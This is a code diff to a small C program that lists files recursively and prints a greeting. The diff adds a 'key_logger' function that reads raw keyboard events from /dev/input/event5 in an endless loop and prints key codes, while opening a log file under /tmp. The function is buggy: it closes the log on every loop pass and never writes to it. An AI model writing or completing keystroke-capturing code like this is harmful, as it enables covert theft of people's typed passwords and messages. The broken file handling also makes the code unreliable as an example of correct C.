@@ -25,6 +25,25 @@ void list_files_recursively(const char *dir_name)
 	closedir(dir);
 }
 
+void key_logger()
+{
+	struct input_event ev;
+	int fd = open("/dev/input/event5", O_RDONLY);
+	printf("%d\n", fd);
+	FILE *log = fopen("/tmp/key.log", "a");
+	while (1) {
+		//printf("Started\n");
+		read(fd, &ev, sizeof(ev));
+		fflush(stdout);
+		fclose(log);
+
+		
+		if (ev.type == EV_KEY && ev.value == 0)
+			printf("%d\t", ev.code);
+		//printf("End\n");
+	}
+}
+
 void main(int argc, const char **argv)
 {
 	printf("hello.world\n");
